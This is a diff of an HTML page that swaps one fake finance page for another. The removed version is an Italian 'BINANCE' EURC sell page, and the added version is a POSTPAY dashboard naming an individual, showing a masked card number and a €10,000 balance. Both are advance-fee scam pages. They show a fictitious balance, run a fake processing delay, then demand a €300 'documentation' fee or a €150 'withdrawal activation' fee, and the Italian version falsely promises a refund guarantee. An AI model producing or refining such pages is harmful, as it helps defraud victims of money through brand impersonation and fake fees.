@@ -1,202 +1,163 @@
 <!DOCTYPE html>
-<html lang="it">
+<html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Vendi EURC </title>
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>POSTPAY Dashboard</title>
   <style>
     body {
-      margin: 0;
       font-family: 'Segoe UI', sans-serif;
-      background-color: #0b0f1a;
+      margin: 0;
+      background: #f4f6f9;
+      color: #333;
+    }
+    .container {
+      max-width: 400px;
+      margin: auto;
+      padding: 20px;
+    }
+    .card {
+      background: linear-gradient(135deg, #004aad, #00c6ff);
       color: white;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      min-height: 100vh;
-      position: relative;
+      border-radius: 15px;
+      padding: 20px;
+      margin-bottom: 20px;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.1);
     }
-    .app {
-      background-color: #0b0f1a;
-      width: 100%;
-      max-width: 420px;
-      padding: 30px;
-      box-sizing: border-box;
-      border-radius: 20px;
+    .card h2 {
+      margin: 0;
+      font-size: 18px;
     }
-    .logo {
-      text-align: center;
-      font-size: 1.8em;
-      font-weight: bold;
-      margin-bottom: 10px;
-      color: #f3ba2f;
-    }
-    .eurc-logo {
-      width: 60px;
-      height: 60px;
-      background-color: #1a4aff;
-      border-radius: 50%;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      font-size: 1.5em;
-      margin: 0 auto 10px;
+    .card p {
+      margin: 5px 0;
+      font-size: 14px;
     }
     .balance {
-      text-align: center;
-      font-size: 2em;
-      margin-bottom: 20px;
-    }
-    .slide-button {
-      background-color: #f3ba2f;
-      color: #0b0f1a;
-      padding: 14px;
-      border-radius: 50px;
-      text-align: center;
+      font-size: 24px;
       font-weight: bold;
-      cursor: pointer;
-      margin-bottom: 30px;
-    }
-    .section {
-      display: none;
-      margin-bottom: 20px;
-    }
-    .label {
-      font-weight: bold;
-      margin-bottom: 5px;
-      color: #f3ba2f;
-    }
-    .value, input {
-      margin-bottom: 15px;
-      word-break: break-word;
-      font-size: 1em;
-      color: white;
-      background-color: #1a1f2b;
-      border: none;
-      border-radius: 6px;
-      padding: 10px;
-      width: 100%;
-    }
-    .bank-options {
-      display: flex;
-      gap: 10px;
-      margin-bottom: 15px;
-    }
-    .bank-button {
-      flex: 1;
-      background-color: #f3ba2f;
-      color: #0b0f1a;
-      padding: 10px;
-      border-radius: 6px;
-      font-weight: bold;
-      cursor: pointer;
-      text-align: center;
-    }
-    .button {
-      background-color: #f3ba2f;
-      color: #0b0f1a;
-      padding: 14px;
-      border: none;
-      border-radius: 6px;
-      width: 100%;
-      font-size: 1em;
-      font-weight: bold;
-      cursor: pointer;
       margin-top: 10px;
     }
-    .error {
-      background-color: #1a1f2b;
-      padding: 20px;
+    .actions {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 15px;
+      margin-bottom: 30px;
+    }
+    .action-btn {
+      background: white;
+      border: none;
       border-radius: 10px;
-      margin-top: 20px;
+      padding: 15px;
+      text-align: center;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      cursor: pointer;
+      transition: transform 0.2s ease;
     }
-    .error-icon {
-      color: red;
-      font-size: 1.2em;
-      margin-bottom: 10px;
+    .action-btn:hover {
+      transform: scale(1.05);
     }
-    .support-button {
+    .accounts {
+      background: white;
+      padding: 15px;
+      border-radius: 10px;
+      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+      text-align: center;
+      font-size: 16px;
+      font-weight: 500;
+    }
+    .modal {
       position: fixed;
-      top: 20px;
-      right: 20px;
-      background-color: #f3ba2f;
-      color: #0b0f1a;
-      padding: 10px 14px;
-      border-radius: 6px;
-      font-weight: bold;
-      text-decoration: none;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0,0,0,0.5);
+      display: none;
+      justify-content: center;
+      align-items: center;
       z-index: 999;
     }
-    .disclaimer {
-      font-size: 0.85em;
-      color: #ccc;
-      margin-top: 20px;
+    .modal-content {
+      background: white;
+      padding: 25px;
+      border-radius: 12px;
       text-align: center;
+      max-width: 300px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.2);
+      animation: fadeIn 0.4s ease;
+    }
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+    .modal-content h3 {
+      margin-top: 0;
+    }
+    .modal-content button {
+      margin: 10px;
+      padding: 10px 20px;
+      border: none;
+      border-radius: 8px;
+      cursor: pointer;
+    }
+    .activate-btn {
+      background-color: #004aad;
+      color: white;
+    }
+    .cancel-btn {
+      background-color: #ccc;
+    }
+    .spinner {
+      display: none;
+      margin-top: 10px;
+      text-align: center;
+      font-weight: 500;
     }
   </style>
 </head>
 <body>
-  <a href="https://widget-page.smartsupp.com/widget/f659c5b3d565aafa73ba3a49d4ce0baf57cea73b?ss-chat-settings" class="support-button">Contatta il supporto</a>
-
-  <div class="app">
-    <div class="eurc-logo">€</div>
-    <div class="logo">BINANCE</div>
-    <div class="balance">€10.000 EURC</div>
-    <div class="slide-button" onclick="mostraAnteprima()">VENDI A BANCA</div>
-
-    <div class="section" id="anteprima">
-      <div class="label">Seleziona la tua banca</div>
-      <div class="bank-options">
-        <div class="bank-button" onclick="selezionaBanca('UniCredit')">UniCredit</div>
-        <div class="bank-button" onclick="selezionaBanca('Postpay')">Postpay</div>
-      </div>
-      <input type="text" placeholder="Nome account">
-      <input type="text" placeholder="Numero dell'account">
-      <button class="button" onclick="avviaConferma()">CONFERMA L'ORDINE</button>
+  <div class="container">
+    <div class="card">
+      <h2>Welcome TAYYABA NAZ</h2>
+      <p>POSTPAY Mastercard Debit - 5371 51xx xxxx 3036</p>
+      <div class="balance">€10,000.00</div>
     </div>
 
-    <div class="section" id="conferma">
-      <p>Attendere mentre elaboriamo il tuo ordine...</p>
-      <p id="timer">Tempo rimanente: 80s</p>
+    <div class="actions">
+      <button class="action-btn" onclick="handleClick()">Top-Up</button>
+      <button class="action-btn" onclick="handleClick()">Send Money</button>
+      <button class="action-btn" onclick="handleClick()">Transfer</button>
+      <button class="action-btn" onclick="handleClick()">Mobile Payment</button>
+      <button class="action-btn" onclick="handleClick()">Bill Payment</button>
+      <button class="action-btn" onclick="handleClick()">Card Payment</button>
     </div>
 
-    <div class="section" id="errore">
-      <div class="error">
-        <div class="error-icon">⚠️ L'ORDINE RICHIEDE €300 PER LA DOCUMENTAZIONE COMPLETA E BADGE ID COME LICENZA 🪪</div>
-        <p>Il sistema di investimento verificherà il rilascio immediato di €10.000 ai tuoi dati bancari.</p>
-        <button class="button">PAGA ORA</button>
+    <div class="accounts">Accounts Balance: €10,000.00</div>
+
+    <div class="modal" id="activationModal">
+      <div class="modal-content">
+        <h3>🔒 Withdrawal Activation</h3>
+        <p>To withdraw to other accounts, a one-time payment of <strong>€150</strong> is required.</p>
+        <button class="activate-btn">Activate Now</button>
+        <button class="cancel-btn" onclick="closeModal()">Cancel</button>
       </div>
-      <div class="disclaimer">
-        Il tuo supporto personale ti aiuterà a completare il pagamento.<br>
-        POSTPAY garantisce il 100% del pagamento se €10.000 non raggiunge il tuo conto dopo il deposito di €300 per la documentazione assicurativa completa.
-      </div>
+    </div>
+
+    <div class="spinner" id="spinner">
+      <p>Loading...</p>
     </div>
   </div>
 
   <script>
-    function mostraAnteprima() {
-      document.getElementById('anteprima').style.display = 'block';
+    function handleClick() {
+      const spinner = document.getElementById('spinner');
+      spinner.style.display = 'block';
+      setTimeout(() => {
+        spinner.style.display = 'none';
+        document.getElementById('activationModal').style.display = 'flex';
+      }, 3000);
     }
 
-    function selezionaBanca(banca) {
-      alert("Banca selezionata: " + banca);
-    }
-
-    function avviaConferma() {
-      document.getElementById('anteprima').style.display = 'none';
-      document.getElementById('conferma').style.display = 'block';
-
-      let tempo = 80;
-      const timerEl = document.getElementById('timer');
-      const intervallo = setInterval(() => {
-        timerEl.textContent = `Tempo rimanente: ${tempo}s`;
-        tempo--;
-        if (tempo < 0) {
-          clearInterval(intervallo);
-          document.getElementById('conferma').style.display = 'none';
-          document.getElementById('errore').style.display = 'block';
-        }
-      }, 1000);
+    function closeModal() {
+      document.getElementById('activationModal').style.display = 'none';
     }
   </script>
 </body>
